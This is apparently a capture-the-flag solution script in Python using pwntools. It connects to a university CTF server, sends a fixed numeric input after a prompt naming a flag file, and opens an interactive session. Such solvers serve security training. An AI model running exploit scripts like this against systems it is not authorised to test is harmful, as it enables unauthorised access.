#!/usr/bin/env python

from pwn import *

r = remote('bamboofox.cs.nctu.edu.tw', 10001)

r.recvuntil('/home/ctf/flag:')
r.sendline('13,10,9,2,7,12,4,9,2,9,2,8,8,8,8,8,0')

r.interactive()
